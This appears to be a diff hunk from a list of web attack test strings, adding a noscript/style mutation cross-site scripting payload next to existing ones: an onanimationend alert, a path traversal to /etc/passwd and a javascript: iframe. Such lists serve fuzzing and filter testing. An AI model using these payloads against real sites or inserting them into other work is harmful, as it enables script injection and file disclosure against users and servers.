@@ -12,3 +12,5 @@
 <style>@keyframes x{}</style><img style="animation-name:x" onanimationend="alert(1)"></img>
 /user/local/redacted/../../../etc/passwd
 <</p>iframe src=javascript:alert()//
+
+<noscript><p title="</noscript><style onload=alert(document.domain)//">{/*all*/color/*all*/He84393/*all*/;}</style>
